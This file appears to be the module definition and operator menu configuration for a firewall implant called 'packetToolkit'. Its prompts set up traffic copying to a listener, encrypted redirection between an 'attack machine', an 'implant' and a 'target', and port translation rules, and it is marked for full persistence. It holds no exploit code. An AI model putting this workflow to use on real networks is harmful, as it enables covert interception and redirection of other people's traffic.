Entry: EntryPoint
Name: packetToolkit
File: BMASSACRE-3115.exe
Version: 0x03010105
Priority: 1
ID: 0x50101
chain: 0x30000000
activate:  PD_activate
deactivate: PD_deactivate
uninstall: PD_uninstall
getconfig: PD_getConfig
reconfigure: PD_reconfigure
persistence: full
Command: PD_startDroppingHandler
Command: PD_stopDroppingHandler
Command: PD_addRuleHandler
Command: PD_removeRuleHandler
Command: PD_getRulesHandler
Command: PD_clearRulesHandler
Command: PD_getStatsHandler
MUNGE

<interface>

<menu>

  <menuItem>
    <itemText>Create and Manage Tunnels</itemText>
    <miniProg>
      <progName>tunWiz</progName>
      <handler>PD_getStatsHandler</handler>
    </miniProg>
  </menuItem>

</menu>

<menu>
  <menuItem>
    <itemText>Create Copy & Forward Rule</itemText>
    <queryList>
      <query>Firewall --> Listener Source IP        (e.g., FW Untrust IP)</query>
      <query>Firweall --> Listener Destination IP   (e.g., Listener IP)</query>
      <query>Firewall --> Listener Source Port      (0 for no translation)</query>
      <query>Firewall --> Listener Destination Port (0 for no translation)</query>
      <query>Firewall --> Listener Interface #      (enter 0 for Juniper)</query>
      <query>Target --> Firewall Interface #        (enter 0 for Juniper)</query>
      <query>Fix checksums of TCP pkts sent to listener [y/n]</query>
      <query>Fix checksums of UDP pkts sent to listener [y/n]</query>
      <query>Rule timeout (seconds, 0 sets indefinite)</query>
      <query>Enter a BPF string or filename for traffic to forward</query>
    </queryList>
    <miniProg>
      <progName>cfMiniProg</progName>
      <handler>PD_addRuleHandler</handler>
      <argList>
        <arg>--csaddr</arg>
        <arg>--cdaddr</arg>
        <arg>--csport</arg>
        <arg>--cdport</arg>
        <arg>--liface</arg>
        <arg>--tiface</arg>
        <arg>--fixtcp</arg>
        <arg>--fixudp</arg>
        <arg>--timeout</arg>
        <arg>--bpf</arg>
      </argList>
    </miniProg>
  </menuItem>
</menu>

<menu>
  <menuItem>
    <itemText>Create and upload rules for encrypted redirection and start local redirector daemon (must be root)</itemText>
    <queryList>
      <query> 1. Arbitrary non-routable IP address you will send packets to, not 127.0.0.x: (iptables will match on this address) 1.</query>
      <query> 2. What is the IP of this machine? (used for local iptables rules only):                                            2.</query>
      <query> 3. What is the IP address of the attack machine?:                                                                   3.</query>
      <query> 4. What source IP will encrypted packets have when they reach the firewall? (pitch ip):                             4.</query>
      <query> 5. What is the implant IP?:                                                                                         5.</query>
      <query> 6. What is the IP address of the outside interface of the firewall?:                                                6.</query>
      <query> 7. What source IP will decrypted packets have leaving the firewall?:                                                7.</query>
      <query> 8. What is the IP of the target?:                                                                                   8.</query>
      <query> 9. Choose an arbitrary source port for encrypted packets going to the firewall:                                     9.</query>      
      <query>10. Choose an abritrary dest port for encrypted packets going to the firewall:                                      10.</query>
      <query>11. What interface of the firewall that the attack machine is attached to:                                          11.</query>
      <query>12. What interface of the firewall that the target machine is attached to:                                          12.</query>
      <query>13. Enter the encryption key filename (if the file does not exist, one will be created):                            13.</query>
      <query>14. Enter the timeout for the encrypted redirection rules (in seconds, 0 for no timeout):                           14.</query>
      <query>15. (OPTIONAL) What source port will packets coming back to the attacker from the firewall have?:                   15.</query>      
      <query>16. (OPTIONAL) What dest port will packets coming back to the attacker from firewall have?:                         16.</query>
      <query>17. (OPTIONAL) What source port should decrypted packets leaving the firewall have?:                                17.</query>
      <query>18. (OPTIONAL) What destination port should decrypted packets have when they leave the firewall?:                   18.</query>
      <query>19. (OPTIONAL) What source port will packets coming from the target to the firewall have?:                          19.</query>      
      <query>20. (OPTIONAL) What destination port will packets coming from the target to firewall have?:                         20.</query>
      <query>21. (OPTIONAL) Enter the protocol that will be redirected (see note at top, leave blank for all):                   21.</query>
    </queryList>
    <noteList>
      <note>Note: If optional ports are not specified, original ports are used (if applicable)</note>
      <note>Note: See /etc/protocols for a list of valid protocol names</note>
      <note>Warning: If optional redirector or target ports are specified, only TCP and UDP traffic will be redirected</note>
    </noteList>
    <miniProg>
      <progName>start_redirector.pl</progName>
      <handler>PD_addRuleHandler</handler>
      <argList>
        <arg>--clr_tunnel_ip</arg>
        <arg>--local_ip</arg>
        <arg>--orig_src_ip</arg>
        <arg>--enc_tunnel_ip</arg>
        <arg>--enc_redir_ip</arg>                
        <arg>--actual_implant_ip</arg>
        <arg>--clr_redir_ip</arg>                
        <arg>--target_ip</arg>                
        <arg>--enc_tunnel_pt</arg>
        <arg>--enc_redir_pt</arg>                
        <arg>--enc_iface</arg>                
        <arg>--clr_iface</arg>                
        <arg>--enc_key</arg>                
        <arg>--timeout</arg>           
        <arg>--tunnel_to_attacker_src_pt</arg>
        <arg>--tunnel_to_attacker_dest_pt</arg>
        <arg>--redir_to_target_src_pt</arg>
        <arg>--redir_to_target_dest_pt</arg>
        <arg>--target_to_redir_src_pt</arg>               
        <arg>--target_to_redir_dest_pt</arg>                
        <arg>--proto</arg>     
      </argList>
 
    </miniProg>
  </menuItem>
  
  <menuItem>
    <itemText>Stop local encrypted redirector daemon (must be root)</itemText>
    <miniProg>
      <progName>stop_redirector.sh</progName>
      <handler>PD_addRuleHandler</handler>
    </miniProg>
  </menuItem>

  <menuItem>
    <itemText>Restart redirector daemon without creating filters (must be root)</itemText>
    <queryList>
      <query>Arbitrary non-routable IP address you will send packets to, not 127.0.0.x: (iptables will match on this address) </query>
      <query>What is the IP of this machine? (used for local iptables rules only):</query>
      <query>What is the IP address of the attack machine?: </query>      
      <query>What source IP will encrypted packets have when they reach the firewall? (pitch ip): </query>
      <query>What is the IP of the interface on the firewall that encrypted packets will be sent to? (probably implant ip): </query>
      <query>What source IP will decrypted packets have leaving the firewall?: </query>
      <query>What is the IP of the target?: </query>
      <query>Choose an arbitrary source port for encrypted packets going to the firewall: </query>      
      <query>Choose an abritrary dest port for encrypted packets going to the firewall:</query>
      <query>Enter the encryption key filename (if the file does not exist, one will be created): </query>
      <query>(OPTIONAL) What source port will packets coming back to the attacker from the firewall have?: </query>      
      <query>(OPTIONAL) What dest port will packets coming back to the attacker from firewall have?: </query>
      <query>(OPTIONAL) What source port should decrypted packets leaving the firewall have?: </query>
      <query>(OPTIONAL) What destination port should decrypted packets have when they leave the firewall?: </query>
      <query>(OPTIONAL) Enter the protocol that will be redirected (see note at top, leave blank for all): </query>
    </queryList>
    <noteList>
      <note>Note: If optional ports are not specified, original ports are used (if applicable)</note>
      <note>Note: See /etc/protocols for a list of valid protocol names</note>
    </noteList>      
    <miniProg>
      <progName>start_redirector.pl</progName>
      <handler>PD_addRuleHandler</handler>
      <argList>
        <arg>--clr_tunnel_ip</arg>
        <arg>--local_ip</arg>
        <arg>--orig_src_ip</arg>
        <arg>--enc_tunnel_ip</arg>
        <arg>--enc_redir_ip</arg>                
        <arg>--clr_redir_ip</arg>                
        <arg>--target_ip</arg>                
        <arg>--enc_tunnel_pt</arg>
        <arg>--enc_redir_pt</arg>                
        <arg>--enc_key</arg>                
        <arg>--tunnel_to_attacker_src_pt</arg>
        <arg>--tunnel_to_attacker_dest_pt</arg>
        <arg>--redir_to_target_src_pt</arg>
        <arg>--redir_to_target_dest_pt</arg>
        <arg>--proto</arg>   
        <arg>--restart</arg>             
      </argList>
    </miniProg>
  </menuItem>  
</menu>

<menu>
  <menuItem>
    <itemText>Create and upload Port Address Translation rules</itemText>
    <queryList>
      <query>Enter the attacker IP address: </query>      
      <query>Enter the intermediate IP address: </query>      
      <query>(OPTIONAL) Enter the original desination IP address of packets coming from the target:</query>
      <query>(OPTIONAL) Enter the port to be used on the attack machine: </query>
      <query>Enter the number of the interface that the attacker is attached to: </query>      
      <query>Enter the number of the interface that the target is attached to: </query>      
      <query>Enter the first port to be used while doing translation: </query>      
      <query>Enter the timeout for individual entries in the translation table (in seconds, 0 for no timeout): </query>      
      <query>Enter the timeout for the newly created PAT rules (in seconds, 0 for no timeout): </query>      
    </queryList>
    <noteList>
      <note>Note: If optional ports are not specified, original ports are used </note>
    </noteList>      
    <miniProg>
      <progName>pd_start_pat.pl</progName>
      <handler>PD_addRuleHandler</handler>
      <argList>
        <arg>--attack_ip</arg>
        <arg>--intermediate_ip</arg>
        <arg>--orig_dest_ip</arg>
        <arg>--attack_port</arg>
        <arg>--attack_int</arg>
        <arg>--target_int</arg>
        <arg>--port_offset</arg>
        <arg>--trans_timeout</arg>
        <arg>--pat_timeout</arg>
      </argList>
    </miniProg>
  </menuItem>  
</menu>


<menu>

  <menuItem>    
    <itemText>Start Packet Toolkit</itemText>
    <miniProg>
      <progName>pd_miniprog</progName>
      <handler>PD_startDroppingHandler</handler>
      <argList>
        <arg>--name start</arg>
      </argList>
    </miniProg>
  </menuItem>
  
  <menuItem>
    <itemText>Stop Packet Toolkit</itemText>
    <miniProg>
      <progName>pd_miniprog</progName>
      <handler>PD_stopDroppingHandler</handler>
      <argList>
        <arg>--name stop</arg>
      </argList>
    </miniProg>
  </menuItem>
  
  <menuItem>
    <itemText>Get Rules</itemText>
    <queryList>
      <query>Enter the filename to save rules to on the LP</query>
    </queryList>
    <noteList>
      <note>Note: Leave the filename field blank to simply have the rules printed to the screen</note>
    </noteList>
    <miniProg>
      <progName>pd_miniprog</progName>
      <handler>PD_getRulesHandler</handler>
      <argList>
        <arg>--arg</arg>
        <arg>--name get_rules</arg>
      </argList>
    </miniProg>
  </menuItem>

  <menuItem>
    <itemText>Clear Rules</itemText>
    <miniProg>
      <progName>pd_miniprog</progName>
      <handler>PD_clearRulesHandler</handler>
      <argList>
        <arg>--name clear_rules</arg>
      </argList>
    </miniProg>
  </menuItem>

  <menuItem>
    <itemText>Add rule(s) from a file</itemText>
    <queryList>
      <query>Enter the filename: </query>
    </queryList>
    <miniProg>
      <progName>pd_miniprog</progName>
      <handler>PD_addRuleHandler</handler>
      <argList>
        <arg>--arg</arg>
        <arg>--name add_rule</arg>
      </argList>
    </miniProg>
  </menuItem>

  <menuItem>
    <itemText>Remove a rule</itemText>
    <queryList>
      <query>Enter the ID: </query>
    </queryList>
    <miniProg>
      <progName>pd_miniprog</progName>
      <handler>PD_removeRuleHandler</handler>
      <argList>
        <arg>--arg</arg>
        <arg>--name remove_rule</arg>
      </argList>
    </miniProg>
  </menuItem>

  <menuItem>
    <itemText>Get Stats</itemText>
    <queryList>
      <query>Enter the rule to get stats for (0 for overall stats): </query>
    </queryList>
    <miniProg>
      <progName>pd_miniprog</progName>
      <handler>PD_getStatsHandler</handler>
      <argList>
        <arg>--arg</arg>
        <arg>--name get_stats</arg>
      </argList>
    </miniProg>
  </menuItem>
</menu>

</interface>

